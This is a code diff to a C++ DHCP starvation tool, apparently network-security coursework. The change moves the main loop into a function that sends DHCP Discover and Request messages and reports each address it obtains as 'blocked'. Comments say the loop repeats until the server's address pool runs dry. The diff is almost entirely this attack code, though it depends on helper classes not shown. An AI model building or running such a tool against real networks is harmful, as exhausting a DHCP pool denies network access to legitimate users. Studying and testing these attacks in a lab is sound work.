@@ -1,11 +1,9 @@
 #include "include/pds-dhcpstarve.h"
 #include "include/pds-dhcpCore.h"
-#include "include/pds-RawSocketHelper.h"
-
-
+//#include "include/pds-RawSocketHelper.h"
 
 // 12 bytes pseudo header for udp checksum calculation
-struct pseudoUDPHeader
+/*struct pseudoUDPHeader
 {
 	uint32_t source_address;
 	uint32_t dest_address;
@@ -37,7 +35,110 @@ unsigned short csum(unsigned short *ptr, int nbytes)
 	answer = (short)~sum;
 
 	return(answer);
+}*/
+
+std::mutex socketMutex, threadNumberMutex, ipAddressMutex;
+
+int sendMessage(int socket, char* message, int messageLength, sockaddr* serverSettings)
+{
+	std::lock_guard<std::mutex> guard(socketMutex);
+	sendto(socket, message, messageLength, 0, serverSettings, sizeof(sockaddr));
 }
+
+int tryGetMessage(int socket, char* message, int &messageLength, uint32_t xid)
+{
+	std::lock_guard<std::mutex> guard(socketMutex);
+
+	// address of dhcp server -> filled together with response
+	sockaddr_in si_other;
+	unsigned slen = sizeof(sockaddr);
+	int receivedSize = recvfrom(socket, message, messageLength, MSG_PEEK | MSG_DONTWAIT, (sockaddr *)&si_other, &slen);
+	if(xid == DHCPCore::getXID(message, receivedSize))
+	{
+		messageLength = recvfrom(socket, message, messageLength, MSG_DONTWAIT, (sockaddr *)&si_other, &slen);
+		return 1;
+	}
+	return 0;
+}
+
+
+int dhcpStarveClient(int socket, struct sockaddr_in &serverSettings)
+{
+	// create instance of dhcp starve core class
+	DHCPCore* dhcpCoreInstance = new DHCPCore();
+	// create DHCP Discover message
+	dhcpCoreInstance->createDHCPDiscoverMessage();
+	if (dhcpCoreInstance->isError())
+	{
+		// error occured tidy up and exit
+		delete(dhcpCoreInstance);
+		return(1);
+	}
+	// send message
+	//sendto(senderSocket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), 0, (sockaddr*)&serverSettings, sizeof(serverSettings));
+	sendMessage(socket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), (sockaddr*)&serverSettings);
+
+	// start timer to check if we already do not wait to long for offer
+	auto timeStart = std::chrono::high_resolution_clock::now();
+	// get the response -> is blocking if no response, the code will get stack
+	// TO-DO: Check what happend if pool is dried out
+	char message[ETHERNET_MTU];
+	int messageLength = ETHERNET_MTU;
+	// wait for DHCPOFFER	
+	while(true)
+	{
+		std::memset(&message, 0, sizeof(message));
+		int forMe = tryGetMessage(socket, &message[0], messageLength, dhcpCoreInstance->getCurrentXID());
+		if(forMe)
+		{
+			if(dhcpCoreInstance->getState() == DHCP_TYPE_DISCOVER)
+			{
+				// load response to dhcp_packet struct
+				dhcpCoreInstance->ProcessDHCPOfferMessage(message, messageLength);
+				if (dhcpCoreInstance->isError())
+				{
+					// error occured tidy up and exi
+					delete(dhcpCoreInstance);
+					return(1);
+				}
+				sendMessage(socket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), (sockaddr*)&serverSettings);
+			}
+			else if(dhcpCoreInstance->getState() == DHCP_TYPE_REQUEST)
+			{
+				dhcpCoreInstance->ProcessDHCPAckMessage(message, messageLength);
+				if (dhcpCoreInstance->isError())
+				{
+					// error occured tidy up and exi
+					delete(dhcpCoreInstance);
+					return(1);
+				}
+				// check if ack obtained
+				if(dhcpCoreInstance->getState() == DHCP_TYPE_ACK)
+				{
+					fprintf(stdout, "IP address blocked!\n");
+					break;
+				}
+			}
+		}
+		// not my packet, try again in a time or end if we waited too long
+		// check if wait more
+		std::chrono::duration<double, std::milli> ms = std::chrono::high_resolution_clock::now() - timeStart;
+		if(ms.count() > WAIT_FOR_RESPONSE_TIME)
+		{
+			fprintf(stderr, "Time out for offer!\n");
+			delete(dhcpCoreInstance);
+			return(1);
+		} 
+		// sleep for a while
+		std::this_thread::sleep_for(std::chrono::milliseconds(WAIT_BEFORE_CHECK_SOCKET_AGAIN));
+	}
+
+	// clean and exit thread
+
+	delete(dhcpCoreInstance);
+	return(1);
+}
+
 
 
 int main(int argc, char* argv[])
@@ -75,15 +176,6 @@ int main(int argc, char* argv[])
 
 	std::cout << "Interface: " << chosenInterface << std::endl;
 
-	// create instance of dhcp starve core class
-	DHCPCore* dhcpCoreInstance = new DHCPCore();
-	dhcpCoreInstance->getDeviceIPAddressNetMask(chosenInterface);
-	if (dhcpCoreInstance->isError())
-	{
-		// error occured tidy up and exit
-		delete(dhcpCoreInstance);
-		exit(1);
-	}
 
 	// SOCKET FOR SENDING --------------------------------------------------------------------
 	// create socket and send message 
@@ -91,7 +183,6 @@ int main(int argc, char* argv[])
 	if ((senderSocket = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
 	{
 		fprintf(stderr, "Cannot create socket.");
-		delete(dhcpCoreInstance);
 		exit(1);
 	}
 
@@ -102,7 +193,6 @@ int main(int argc, char* argv[])
 	if(setsockopt(senderSocket, SOL_SOCKET, SO_BINDTODEVICE, (void*)&ifr, sizeof(ifr)) < 0)
 	{
 		fprintf(stderr, "Cannot assign socket to interface: %s. %s\n", chosenInterface.c_str(), strerror(errno));
-		delete(dhcpCoreInstance);
 		exit(1);
 	}
 	// enable broadcast on socket
@@ -110,13 +200,11 @@ int main(int argc, char* argv[])
 	if(setsockopt(senderSocket, SOL_SOCKET, SO_BROADCAST, &optVal, sizeof(optVal)) < 0)
 	{
 		fprintf(stderr, "Cannot set socket to broadcast: %s. %s\n", chosenInterface.c_str(), strerror(errno));
-		delete(dhcpCoreInstance);
 		exit(1);
 	}
 	if(setsockopt(senderSocket, SOL_SOCKET, SO_REUSEADDR, &optVal, sizeof(optVal)) < 0)
 	{
 		fprintf(stderr, "Cannot set socket to broadcast: %s. %s\n", chosenInterface.c_str(), strerror(errno));
-		delete(dhcpCoreInstance);
 		exit(1);
 	}	
 	struct sockaddr_in interfaceSettings;
@@ -127,7 +215,6 @@ int main(int argc, char* argv[])
 	if (bind(senderSocket, (sockaddr*)&interfaceSettings, sizeof(interfaceSettings)) < 0)
 	{ // cannot bind socket to given address and port
 		fprintf(stderr, "Cannot bind socket to interface: %s. %s\n", chosenInterface.c_str(), strerror(errno));
-		delete(dhcpCoreInstance);
 		exit(1);
 	}
 	
@@ -140,65 +227,11 @@ int main(int argc, char* argv[])
 	if ((inet_pton(AF_INET, DHCP_SERVER_ADDRESS, &serverSettings.sin_addr)) <= 0)
 	{
 		fprintf(stderr, "Cannot set server address (%s) -> inet_pton error.\n", DHCP_SERVER_ADDRESS);
-		delete(dhcpCoreInstance);
 		exit(1);
 	}
 
-	// create buffer to catch the respons, TO-DO: MAYBE CATCH USING BUFFER IN DHCP CORE ------------------------
-	char *response = 0;
-	response = new char[ETHERNET_MTU];
-	// address of dhcp server -> filled together with response
-	sockaddr_in si_other;
-	unsigned slen = sizeof(sockaddr);
+	// --------------------------- COMMUNICATION START -------------------------------------------------
+	int ret = dhcpStarveClient(senderSocket, serverSettings);
 
-	int i = 0;
-	while (i < 1) // repeate until pool dried out
-	{
-		// init buffer for response
-		std::fill_n(response, ETHERNET_MTU, 0);
-
-		// create DHCP Discover message
-		dhcpCoreInstance->createDHCPDiscoverMessage();
-		if (dhcpCoreInstance->isError())
-		{
-			// error occured tidy up and exit
-			delete(dhcpCoreInstance);
-			exit(1);
-		}
-
-		// send message
-		sendto(senderSocket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), 0, (sockaddr*)&serverSettings, sizeof(serverSettings));
-		fprintf(stdout, "Packet send.\n");
-
-		// get the response -> is blocking if no response, the code will get stack
-		// TO-DO: Check what happend if pool is dried out
-		//int receivedSize = recvfrom(receiverSocket, response, ETHERNET_MTU, 0, (sockaddr *)&si_other, &slen);
-		int receivedSize = recvfrom(senderSocket, response, ETHERNET_MTU, 0, (sockaddr *)&si_other, &slen);
-		struct sockaddr_in *s = (struct sockaddr_in *)&si_other;
-		int port = ntohs(s->sin_port);
-		char ipstr[INET_ADDRSTRLEN];
-		inet_ntop(AF_INET, &s->sin_addr, ipstr, sizeof ipstr);
-		printf("address: %s , port: %d\n", ipstr, port);
-
-		// load response to dhcp_packet struct
-		dhcpCoreInstance->ProcessDHCPOfferMessage(response, receivedSize);
-		if (dhcpCoreInstance->isError())
-		{
-			// error occured tidy up and exit
-			delete(dhcpCoreInstance);
-			exit(1);
-		}
-		else
-		{
-			// send DHCP request
-		}
-		// wait for DHCPACK
-
-		i++;
-	}
-	// free the array for response
-	delete(response);
-
-	delete(dhcpCoreInstance);
-	exit(0);
+	exit(ret);
 }
